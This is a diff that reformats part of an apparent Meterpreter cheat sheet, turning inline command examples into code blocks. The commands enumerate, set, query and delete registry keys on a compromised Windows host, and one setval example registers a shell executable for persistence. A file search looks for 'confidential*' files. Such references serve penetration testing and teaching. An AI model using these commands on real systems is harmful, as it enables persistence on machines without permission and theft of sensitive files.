@@ -471,33 +471,47 @@ COMMANDS:
 
 ### 3.4.1 - Basic Commands
 
-- Syntax registry meterpreter command.
+Syntax registry meterpreter command.
 
-`meterpreter > reg <command> [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <registry_value> -t <registry_type>`
+```
+meterpreter > reg <command> [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <registry_value> -t <registry_type>
+```
 
-- Enumerate registry key.
+Enumerate registry key.
 
-`meterpreter > reg enumkey [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key`
+```
+meterpreter > reg enumkey [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key
+```
 
-- Set registry key value.
+Set registry key value.
 
-`meterpreter > reg setval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value> -t <registry_type> -d 'C:\path\to\shell.exe'`
+```
+meterpreter > reg setval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value> -t <registry_type> -d 'C:\path\to\shell.exe'
+```
 
-- Query registry key value.
+Query registry key value.
 
-`meterpreter > reg queryval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value>`
+```
+meterpreter > reg queryval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value>
+```
 
-- Delete registry key value.
+Delete registry key value.
 
-`meterpreter > reg deleteval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value>`
+```
+meterpreter > reg deleteval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value>
+```
 
-- Create registry subkey.
+Create registry subkey.
 
-`meterpreter > reg createkey [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\new_key [-w <32 | 64>]`
+```
+meterpreter > reg createkey [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\new_key [-w <32 | 64>]
+```
 
-- Query registry keys
+Query registry keys
 
-`meterpreter > reg queryclass [-r <target_IP>] -k <hive_name>\\path\\to\\registry`
+```
+meterpreter > reg queryclass [-r <target_IP>] -k <hive_name>\\path\\to\\registry
+```
 
 ## 3.5 - Search Files
 
@@ -518,7 +532,9 @@ OPTIONS:
 
 * Basic Commands
 
-`meterpreter > search -d [<drive_letter>:]/path/to/directory/ -f confidential*`
+```
+meterpreter > search -d [<drive_letter>:]/path/to/directory/ -f confidential*
+```
 
 ---
 ## References
